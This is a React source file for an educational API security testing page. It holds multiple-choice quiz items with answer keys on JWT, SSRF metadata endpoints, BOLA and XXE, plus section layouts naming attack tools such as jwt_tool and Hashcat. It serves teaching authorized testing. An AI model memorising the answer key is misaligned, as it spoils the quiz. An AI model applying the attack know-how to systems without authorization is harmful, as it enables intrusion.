    question: "JWT kid header attacks attempt to:",
    options: ["Load a malicious key", "Expire tokens", "Rotate secrets", "Improve caching"],
    correctAnswer: 0,
    explanation: "kid can be abused to select attacker-controlled keys.",
  },
  {
    id: 68,
    topic: "Sessions",
    question: "Session IDs should be:",
    options: ["Random and high entropy", "Sequential", "Usernames", "Timestamps"],
    correctAnswer: 0,
    explanation: "High entropy prevents guessing.",
  },
  {
    id: 69,
    topic: "Scope",
    question: "Security testing should be performed on:",
    options: ["Authorized, in-scope targets", "Any public IP", "Competitor APIs", "Unpatched systems"],
    correctAnswer: 0,
    explanation: "Testing must be authorized and scoped.",
  },
  {
    id: 70,
    topic: "Reporting",
    question: "A good report should include:",
    options: ["Impact, steps to reproduce, and remediation", "Only raw logs", "Only CVSS", "Only screenshots"],
    correctAnswer: 0,
    explanation: "Clear impact and remediation make reports actionable.",
  },
  {
    id: 71,
    topic: "Headers",
    question: "The CSP directive to control framing is:",
    options: ["frame-ancestors", "script-src", "img-src", "connect-src"],
    correctAnswer: 0,
    explanation: "frame-ancestors restricts framing sources.",
  },
  {
    id: 72,
    topic: "OAuth",
    question: "Open redirect issues can lead to:",
    options: ["Token leakage and phishing", "Better caching", "Stronger auth", "Improved UX"],
    correctAnswer: 0,
    explanation: "Redirects can send tokens to attacker domains.",
  },
  {
    id: 73,
    topic: "GraphQL",
    question: "GraphQL errors can leak:",
    options: ["Schema details and stack traces", "JWT secrets", "DNS records", "TLS keys"],
    correctAnswer: 0,
    explanation: "Errors may expose schema and internal details.",
  },
  {
    id: 74,
    topic: "TLS",
    question: "Certificate validation prevents:",
    options: ["Man-in-the-middle attacks", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "Validating certificates blocks MITM attacks.",
  },
  {
    id: 75,
    topic: "Monitoring",
    question: "Monitoring should alert on:",
    options: ["Authentication failures and anomalies", "All successful logins", "Static content", "Empty responses"],
    correctAnswer: 0,
    explanation: "Auth anomalies are strong indicators of abuse.",
  },
  {
    id: 76,
    topic: "Business Logic",
    question: "Race conditions in APIs can lead to:",
    options: ["Double spending or duplicate actions", "Better performance", "Improved caching", "Stronger encryption"],
    correctAnswer: 0,
    explanation: "Race conditions can bypass validation for duplicate requests.",
  },
  {
    id: 77,
    topic: "Business Logic",
    question: "Idempotency keys help prevent:",
    options: ["Duplicate transactions", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "Idempotency keys ensure operations run only once.",
  },
  {
    id: 78,
    topic: "WebSocket",
    question: "Cross-Site WebSocket Hijacking requires:",
    options: ["Missing Origin validation", "Weak passwords", "Missing CSRF tokens", "Expired certificates"],
    correctAnswer: 0,
    explanation: "CSWSH exploits lack of Origin header verification.",
  },
  {
    id: 79,
    topic: "API Design",
    question: "HATEOAS in REST APIs provides:",
    options: ["Hypermedia links for navigation", "Stronger authentication", "Rate limiting", "Encryption"],
    correctAnswer: 0,
    explanation: "HATEOAS includes links to related resources in responses.",
  },
  {
    id: 80,
    topic: "Versioning",
    question: "Testing older API versions is important because:",
    options: ["They may lack security patches", "They are faster", "They have better logging", "They use stronger encryption"],
    correctAnswer: 0,
    explanation: "Deprecated versions often have unpatched vulnerabilities.",
  },
  {
    id: 81,
    topic: "SSRF",
    question: "The GCP metadata endpoint is:",
    options: ["169.254.169.254 or metadata.google.internal", "127.0.0.1", "10.0.0.1", "192.168.1.1"],
    correctAnswer: 0,
    explanation: "GCP uses the same IP as AWS for metadata.",
  },
  {
    id: 82,
    topic: "Injection",
    question: "Content-Type switching can enable:",
    options: ["XXE attacks when JSON APIs accept XML", "CSRF", "Rate limit bypass", "Token refresh"],
    correctAnswer: 0,
    explanation: "Switching to XML may enable XXE if not blocked.",
  },
  {
    id: 83,
    topic: "GraphQL",
    question: "Field suggestions in GraphQL errors can reveal:",
    options: ["Schema information when introspection is disabled", "Database passwords", "API keys", "JWT secrets"],
    correctAnswer: 0,
    explanation: "Error messages may suggest valid field names.",
  },
  {
    id: 84,
    topic: "Authorization",
    question: "Testing with two accounts helps identify:",
    options: ["BOLA/IDOR vulnerabilities", "XSS", "SQL injection", "Rate limits"],
    correctAnswer: 0,
    explanation: "Two accounts reveal access control issues between users.",
  },
  {
    id: 85,
    topic: "Authentication",
    question: "PKCE code_verifier should be:",
    options: ["A high-entropy random string", "The client secret", "The redirect URI", "The user password"],
    correctAnswer: 0,
    explanation: "PKCE uses a random verifier to protect the auth code.",
  },
];


function TopicAccordion({ topics }: { topics: TopicSection[] }) {
  const theme = useTheme();

  return (
    <>
      {topics.map((topic, index) => (
        <Accordion
          key={topic.title}
          defaultExpanded={index === 0}
          sx={{
            mb: 2,
            border: `1px solid ${alpha(topic.color, 0.2)}`,
            borderRadius: "12px !important",
            "&:before": { display: "none" },
            overflow: "hidden",
          }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            sx={{
              borderLeft: `4px solid ${topic.color}`,
              "&:hover": { bgcolor: alpha(topic.color, 0.02) },
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
              <Box
                sx={{
                  width: 40,
                  height: 40,
                  borderRadius: 2,
                  bgcolor: alpha(topic.color, 0.1),
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: topic.color,
                }}
              >
                {topic.icon}
              </Box>
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700 }}>
                  {topic.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ display: { xs: "none", sm: "block" } }}>
                  {topic.description}
                </Typography>
              </Box>
            </Box>
          </AccordionSummary>
          <AccordionDetails sx={{ pt: 0 }}>
            <Grid container spacing={3}>
              {/* Key Points */}
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: topic.color }}>
                  📋 Key Points
                </Typography>
                <List dense disablePadding>
                  {topic.keyPoints.map((point, i) => (
                    <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: topic.color }} />
                      </ListItemIcon>
                      <ListItemText primary={point} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Grid>

              {/* Techniques */}
              <Grid item xs={12} md={6}>
                {topic.techniques && (
                  <Box sx={{ mb: 3 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "warning.main" }}>
                      ⚡ Techniques
                    </Typography>
                    <Paper
                      sx={{
                        p: 2,
                        bgcolor: alpha(theme.palette.warning.main, 0.03),
                        border: `1px solid ${alpha(theme.palette.warning.main, 0.15)}`,
                        borderRadius: 2,
                      }}
                    >
                      {topic.techniques.map((technique, i) => (
                        <Typography
                          key={i}
                          variant="body2"
                          sx={{
                            fontFamily: "monospace",
                            fontSize: "0.8rem",
                            mb: i < topic.techniques!.length - 1 ? 1 : 0,
                          }}
                        >
                          → {technique}
                        </Typography>
                      ))}
                    </Paper>
                  </Box>
                )}

                {topic.tools && (
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5 }}>
                      🛠️ Tools
                    </Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {topic.tools.map((tool) => (
                        <Chip
                          key={tool}
                          label={tool}
                          size="small"
                          sx={{
                            bgcolor: alpha(topic.color, 0.1),
                            color: topic.color,
                            fontWeight: 500,
                          }}
                        />
                      ))}
                    </Box>
                  </Box>
                )}
              </Grid>

              {/* Code Example */}
              {topic.codeExample && (
                <Grid item xs={12}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>
                    💻 Example
                  </Typography>
                  <CodeBlock code={topic.codeExample} />
                </Grid>
              )}

              {/* Tips */}
              {topic.tips && (
                <Grid item xs={12}>
                  <Alert
                    severity="info"
                    icon={<InfoIcon />}
                    sx={{
                      borderRadius: 2,
                      "& .MuiAlert-message": { width: "100%" },
                    }}
                  >
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                      💡 Pro Tips
                    </Typography>
                    <List dense disablePadding>
                      {topic.tips.map((tip, i) => (
                        <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                          <Typography variant="body2">• {tip}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Alert>
                </Grid>
              )}
            </Grid>
          </AccordionDetails>
        </Accordion>
      ))}
    </>
  );
}

export default function ApiSecurityPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const isLgUp = useMediaQuery(theme.breakpoints.up("lg"));
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("intro");
  const [quizPool] = useState<QuizQuestion[]>(() =>
    selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
  );

  const scrollToSection = (id: string) => {
    const el = document.getElementById(id);
    if (el) {
      el.scrollIntoView({ behavior: "smooth", block: "start" });
      setActiveSection(id);
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((s) => s.id);
      for (const id of sections) {
        const el = document.getElementById(id);
        if (el) {
          const rect = el.getBoundingClientRect();
          if (rect.top <= 150 && rect.bottom > 150) {
            setActiveSection(id);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll, { passive: true });
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const pageContext = `This page provides a comprehensive guide to API security testing based on OWASP API Security Top 10. Topics include API discovery and enumeration, authentication testing (API keys, JWT attacks, OAuth vulnerabilities), authorization testing (BOLA/IDOR, BFLA), injection attacks (SQL, NoSQL, SSRF, command injection), data exposure and mass assignment, rate limiting bypass techniques, and GraphQL-specific security testing including introspection and query complexity attacks. Current section: ${activeSection}.`;

  // Sidebar navigation component
  const sidebarNav = (
    <Paper
      sx={{
        p: 2,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        bgcolor: "#12121a",
        border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
        borderRadius: 2,
      }}
    >
      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: ACCENT_COLOR, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
        <ListAltIcon fontSize="small" />
        Contents
      </Typography>
      <Box sx={{ mb: 2 }}>
        <LinearProgress
          variant="determinate"
          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
          sx={{
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
          }}
        />
        <Typography variant="caption" sx={{ color: "grey.500", mt: 0.5, display: "block" }}>
          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
        </Typography>
      </Box>
      <List dense disablePadding>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            component="button"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
              cursor: "pointer",
              border: "none",
              width: "100%",
              textAlign: "left",
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
            }}
          >
            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "grey.500" }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={item.label}
              primaryTypographyProps={{
                variant: "body2",
                fontWeight: activeSection === item.id ? 600 : 400,
                color: activeSection === item.id ? "#e0e0e0" : "grey.400",
              }}
            />
          </ListItem>
        ))}
      </List>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="API Security Testing" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
      <Container maxWidth="xl">
        <Grid container spacing={3}>
          {/* Sidebar Navigation - Desktop */}
          {isLgUp && (
            <Grid item lg={2.5} sx={{ display: { xs: "none", lg: "block" } }}>
              {sidebarNav}
            </Grid>
          )}

          {/* Main Content */}
          <Grid item xs={12} lg={9.5}>
            {/* Header */}
            <Box id="intro" sx={{ mb: 4 }}>
              <Chip
                component={Link}
                to="/learn"
                icon={<ArrowBackIcon />}
                label="Back to Learning Hub"
                clickable
                variant="outlined"
                sx={{ borderRadius: 2, mb: 3 }}
              />
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                <ApiIcon sx={{ fontSize: 40, color: ACCENT_COLOR }} />
                <Typography
                  variant="h3"
                  sx={{
                    fontWeight: 700,
                    background: `linear-gradient(135deg, ${ACCENT_COLOR} 0%, #8b5cf6 100%)`,
                    backgroundClip: "text",
                    WebkitBackgroundClip: "text",
                    color: "transparent",
                  }}
                >
                  API Security Testing
                </Typography>
              </Box>
              <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
                Comprehensive guide to REST, GraphQL, and API vulnerability testing
              </Typography>
              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                <Chip icon={<ApiIcon />} label="REST APIs" size="small" />
                <Chip icon={<SchemaIcon />} label="GraphQL" size="small" />
                <Chip icon={<VpnKeyIcon />} label="JWT/OAuth" size="small" />
                <Chip icon={<SecurityIcon />} label="OWASP API Top 10" size="small" />
              </Box>
            </Box>

            {/* Introduction Section */}
            <Paper
              sx={{
                p: 4,
                mb: 4,
                borderRadius: 3,
                background: `linear-gradient(135deg, ${alpha(ACCENT_COLOR, 0.15)} 0%, ${alpha("#8b5cf6", 0.1)} 50%, ${alpha(ACCENT_COLOR, 0.05)} 100%)`,
                border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
              }}
            >
              <Typography variant="h5" gutterBottom sx={{ fontWeight: 700, color: "#e0e0e0" }}>
                What is API Security Testing?
              </Typography>
              <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
                <strong>API Security Testing</strong> focuses on identifying vulnerabilities in Application Programming Interfaces (APIs)
                that applications use to communicate with each other. Modern applications heavily rely on REST APIs, GraphQL endpoints,
                and WebSocket connections, making API security critical.
              </Typography>
              <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
                Unlike traditional web testing, API testing requires understanding authentication tokens, rate limiting, data serialization,
                and the unique attack vectors that affect programmatic interfaces.
              </Typography>
              <Grid container spacing={2} sx={{ mb: 3 }}>
                {[
                  { icon: <BugReportIcon />, title: "Find API Flaws", desc: "Discover BOLA, injection, and auth issues", color: "#ef4444" },
                  { icon: <SecurityIcon />, title: "OWASP API Top 10", desc: "Test against the latest API security risks", color: "#f59e0b" },
                  { icon: <HttpIcon />, title: "REST & GraphQL", desc: "Cover all API architectures", color: "#22c55e" },
                  { icon: <VpnKeyIcon />, title: "Auth Testing", desc: "JWT, OAuth, and API key security", color: "#06b6d4" },
                ].map((item) => (
                  <Grid item xs={12} sm={6} md={3} key={item.title}>
                    <Card
                      sx={{
                        height: "100%",
                        bgcolor: alpha(item.color, 0.1),
                        border: `1px solid ${alpha(item.color, 0.3)}`,
                        borderRadius: 2,
                      }}
                    >
                      <CardContent>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: item.color }}>
                          {item.icon}
                          <Typography variant="subtitle2" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{item.title}</Typography>
                        </Box>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* Stats */}
            <Grid container spacing={2} sx={{ mb: 4 }}>
              {[
                { value: "10", label: "Sections", color: ACCENT_COLOR },
                { value: "25+", label: "Attack Types", color: "#ef4444" },
                { value: "50+", label: "Techniques", color: "#f59e0b" },
                { value: "OWASP", label: "API Top 10", color: "#10b981" },
              ].map((stat) => (
                <Grid item xs={6} md={3} key={stat.label}>
                  <Paper
                    sx={{
                      p: 2.5,
                      textAlign: "center",
                      borderRadius: 3,
                      bgcolor: alpha(stat.color, 0.08),
                      border: `1px solid ${alpha(stat.color, 0.2)}`,
                    }}
                  >
                    <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                      {stat.value}
                    </Typography>
                    <Typography variant="body2" sx={{ color: "grey.400" }}>
                      {stat.label}
                    </Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            {/* OWASP API Top 10 Reference */}
            <Box id="overview">
              <Paper
                sx={{
                  p: 4,
                  mb: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#10b981", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#e0e0e0", display: "flex", alignItems: "center", gap: 2 }}>
                  <SecurityIcon sx={{ color: "#10b981" }} />
                  OWASP API Security Top 10 (2023)
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { num: "API1", name: "Broken Object Level Authorization", desc: "BOLA/IDOR - Accessing other users' data", color: "#ef4444" },
                    { num: "API2", name: "Broken Authentication", desc: "Weak auth mechanisms, credential attacks", color: "#f59e0b" },
                    { num: "API3", name: "Broken Object Property Level Authorization", desc: "BOPLA - Mass assignment, excessive exposure", color: "#8b5cf6" },
                    { num: "API4", name: "Unrestricted Resource Consumption", desc: "Rate limiting, DoS vulnerabilities", color: "#06b6d4" },
                    { num: "API5", name: "Broken Function Level Authorization", desc: "BFLA - Accessing admin functions", color: "#ec4899" },
                    { num: "API6", name: "Unrestricted Access to Sensitive Flows", desc: "Business logic abuse", color: "#f97316" },
                    { num: "API7", name: "Server-Side Request Forgery", desc: "SSRF via API parameters", color: "#22c55e" },
                    { num: "API8", name: "Security Misconfiguration", desc: "Missing hardening, verbose errors", color: "#6366f1" },
                    { num: "API9", name: "Improper Inventory Management", desc: "Undocumented/deprecated APIs exposed", color: "#a855f7" },
                    { num: "API10", name: "Unsafe Consumption of APIs", desc: "Trusting third-party APIs blindly", color: "#14b8a6" },
                  ].map((item) => (
                    <Grid item xs={12} sm={6} key={item.num}>
                      <Paper
                        sx={{
                          p: 2,
                          bgcolor: alpha(item.color, 0.08),
                          border: `1px solid ${alpha(item.color, 0.2)}`,
                          borderRadius: 2,
                        }}
                      >
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                          <Chip label={item.num} size="small" sx={{ bgcolor: item.color, color: "white", fontWeight: 700 }} />
                          <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#e0e0e0" }}>
                            {item.name}
                          </Typography>
                        </Box>
                        <Typography variant="caption" sx={{ color: "grey.400" }}>
                          {item.desc}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Box>

            {/* Discovery Section */}
            <Box id="discovery" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#3b82f6", 0.3)}`,
                }}
              >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <SearchIcon sx={{ color: "#3b82f6" }} />
                  API Discovery & Enumeration
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Before testing, you need to find and map all API endpoints, understand the technology stack,
                  and gather documentation.
                </Typography>
                <TopicAccordion topics={discoveryTopics} />
              </Paper>
            </Box>

            {/* Authentication Section */}
            <Box id="authentication" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <VpnKeyIcon sx={{ color: "#8b5cf6" }} />
                  Authentication Testing
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Test API authentication mechanisms including API keys, JWTs, OAuth, and session management
                  for common vulnerabilities.
                </Typography>
                <TopicAccordion topics={authTopics} />
              </Paper>
            </Box>

            {/* Authorization Section */}
            <Box id="authorization" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#ef4444", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <AdminPanelSettingsIcon sx={{ color: "#ef4444" }} />
                  Authorization Testing (BOLA/BFLA)
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA)
                  are the #1 and #5 API security risks. Test thoroughly!
                </Typography>
                <TopicAccordion topics={authzTopics} />
              </Paper>
            </Box>

            {/* Injection Section */}
            <Box id="injection" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#f59e0b", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <BugReportIcon sx={{ color: "#f59e0b" }} />
                  Injection Attacks
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Test API parameters, headers, and request bodies for SQL injection, NoSQL injection,
                  command injection, and SSRF.
                </Typography>
                <TopicAccordion topics={injectionTopics} />
              </Paper>
            </Box>

            {/* Data Exposure Section */}
            <Box id="data-exposure" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#10b981", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <VisibilityIcon sx={{ color: "#10b981" }} />
                  Data Exposure & Mass Assignment
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  APIs often return more data than necessary or allow modification of restricted fields.
                  Look for sensitive data leaks and mass assignment vulnerabilities.
                </Typography>
                <TopicAccordion topics={dataTopics} />
              </Paper>
            </Box>

            {/* Rate Limits Section */}
            <Box id="rate-limits" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#06b6d4", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <SpeedIcon sx={{ color: "#06b6d4" }} />
                  Rate Limiting & Resource Exhaustion
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Test API rate limiting implementation and look for bypass techniques.
                  Also test for denial of service through resource exhaustion.
                </Typography>
                <TopicAccordion topics={rateLimitTopics} />
              </Paper>
            </Box>

            {/* GraphQL Section */}
            <Box id="graphql" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#e535ab", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <SchemaIcon sx={{ color: "#e535ab" }} />
                  GraphQL Security
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  GraphQL has unique attack vectors including introspection, query complexity attacks,
                  batching abuse, and authorization bypass through nested queries.
                </Typography>
                <TopicAccordion topics={graphqlTopics} />
              </Paper>
            </Box>

            {/* Checklist Section */}
            <Box id="checklist" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#ec4899", 0.3)}`,
                }}
              >
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
                  <CheckCircleIcon sx={{ color: "#ec4899" }} />
                  API Security Testing Checklist
                </Typography>
                <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                  Use this checklist to ensure comprehensive coverage during your API security assessments.
                </Typography>
                <Grid container spacing={3}>
                  {checklistItems.map((category) => (
                    <Grid item xs={12} sm={6} md={4} key={category.category}>
                      <Card
                        sx={{
                          height: "100%",
                          borderTop: `4px solid ${category.color}`,
                          borderRadius: 2,
                          bgcolor: alpha(category.color, 0.05),
                        }}
                      >
                        <CardContent>
                          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: category.color }}>
                            {category.category}
                          </Typography>
                          {category.items.map((item) => (
                            <Box key={item} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                              <Box
                                sx={{
                                  width: 18,
                                  height: 18,
                                  border: `2px solid ${alpha(category.color, 0.3)}`,
                                  borderRadius: 0.5,
                                  flexShrink: 0,
                                }}
                              />
                              <Typography variant="body2">{item}</Typography>
                            </Box>
                          ))}
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Box>

            {/* Tools & Resources Section */}
            <Box id="tools" sx={{ mt: 4 }}>
              <Paper sx={{ p: 4, borderRadius: 3, bgcolor: "#0f1024", border: `1px solid ${alpha("#06b6d4", 0.3)}` }}>
                <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#e0e0e0", display: "flex", alignItems: "center", gap: 2 }}>
                  <BuildIcon sx={{ color: "#06b6d4" }} />
                  Essential API Testing Tools
                </Typography>
                <Grid container spacing={2} sx={{ mb: 4 }}>
                  {[
                    { category: "Proxy & Interception", color: "#ef4444", tools: [
                      { name: "Burp Suite", desc: "Industry-standard with API testing extensions" },
                      { name: "OWASP ZAP", desc: "Free, open-source proxy with API scanning" },
                      { name: "mitmproxy", desc: "CLI-based for automation and scripting" },
                    ]},
                    { category: "API Discovery", color: "#f59e0b", tools: [
                      { name: "Kiterunner", desc: "API route discovery using wordlists" },
                      { name: "ffuf", desc: "Fast web fuzzer for endpoint enumeration" },
                      { name: "Arjun", desc: "Parameter discovery tool" },
                    ]},
                    { category: "GraphQL", color: "#8b5cf6", tools: [
                      { name: "InQL", desc: "Burp extension for GraphQL testing" },
                      { name: "GraphQL Voyager", desc: "Schema visualization" },
                      { name: "graphql-cop", desc: "Security audit for GraphQL" },
                    ]},
                    { category: "JWT & Auth", color: "#22c55e", tools: [
                      { name: "jwt_tool", desc: "JWT manipulation and attacks" },
                      { name: "jwt.io", desc: "Online JWT decoder/debugger" },
                      { name: "Hashcat", desc: "JWT secret cracking" },
                    ]},
                  ].map((cat) => (
                    <Grid item xs={12} sm={6} md={3} key={cat.category}>
                      <Card sx={{ height: "100%", bgcolor: alpha(cat.color, 0.08), border: `1px solid ${alpha(cat.color, 0.2)}`, borderRadius: 2 }}>
                        <CardContent>
                          <Typography variant="subtitle1" sx={{ fontWeight: 700, color: cat.color, mb: 2 }}>
                            {cat.category}
                          </Typography>
                          {cat.tools.map((tool) => (
                            <Box key={tool.name} sx={{ mb: 1.5 }}>
                              <Typography variant="subtitle2" sx={{ fontWeight: 600, color: "#e0e0e0" }}>
                                {tool.name}
                              </Typography>
                              <Typography variant="caption" sx={{ color: "grey.400" }}>
                                {tool.desc}
                              </Typography>
                            </Box>
                          ))}
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>

                <Divider sx={{ my: 3, borderColor: alpha("#06b6d4", 0.2) }} />

                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e0e0e0" }}>
                  📚 Learning Resources
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { name: "OWASP API Security Top 10", url: "https://owasp.org/API-Security/", desc: "Official OWASP API security risks", color: "#ef4444" },
                    { name: "PortSwigger API Testing", url: "https://portswigger.net/web-security/api-testing", desc: "Free labs for API security testing", color: "#f59e0b" },
                    { name: "API Security Checklist", url: "https://github.com/shieldfy/API-Security-Checklist", desc: "Comprehensive API security checklist", color: "#22c55e" },
                    { name: "GraphQL Security", url: "https://graphql.org/learn/security/", desc: "Official GraphQL security guidance", color: "#8b5cf6" },
                    { name: "JWT.io", url: "https://jwt.io/", desc: "JWT debugger and library reference", color: "#06b6d4" },
                    { name: "HackTricks API", url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting", desc: "Practical API hacking techniques", color: "#ec4899" },
                  ].map((resource) => (
                    <Grid item xs={12} sm={6} key={resource.name}>
                      <Paper
                        sx={{
                          p: 2,
                          borderRadius: 2,
                          bgcolor: alpha(resource.color, 0.08),
                          border: `1px solid ${alpha(resource.color, 0.2)}`,
                          cursor: "pointer",
                          transition: "all 0.2s",
                          "&:hover": {
                            borderColor: resource.color,
                            transform: "translateY(-2px)",
                          },
                        }}
                        onClick={() => window.open(resource.url, "_blank")}
                      >
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, color: resource.color }}>
                          {resource.name} ↗
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>
                          {resource.desc}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Box>

            {/* Related Learning Topics */}
            <Box id="related" sx={{ mt: 4 }}>
              <Paper
                sx={{
                  p: 4,
                  borderRadius: 3,
                  bgcolor: "#0f1024",
                  border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
                }}
              >
